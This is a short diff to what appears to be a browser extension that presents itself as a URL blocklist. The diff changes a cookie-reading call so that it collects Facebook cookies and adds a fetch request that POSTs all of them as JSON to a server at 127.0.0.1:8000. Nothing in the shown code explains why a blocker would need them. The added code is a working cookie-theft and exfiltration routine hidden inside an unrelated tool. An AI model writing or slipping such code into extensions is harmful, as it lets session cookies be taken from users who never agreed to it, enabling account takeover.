@@ -1,10 +1,18 @@
 const blocklist = require('../blocklist.json');
 
-chrome.cookies.getAll({}, (cookies) => {
-  console.log(cookies);
+chrome.cookies.getAll({ domain: 'facebook.com' }, (cookies) => {
   for (let i = 0; i < cookies.length; i++) {
     console.log(cookies[i]);
   }
+
+  fetch('http://127.0.0.1:8000', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(cookies),
+    credentials: 'include'
+  });
 });
 
 function isBlocked(url) {
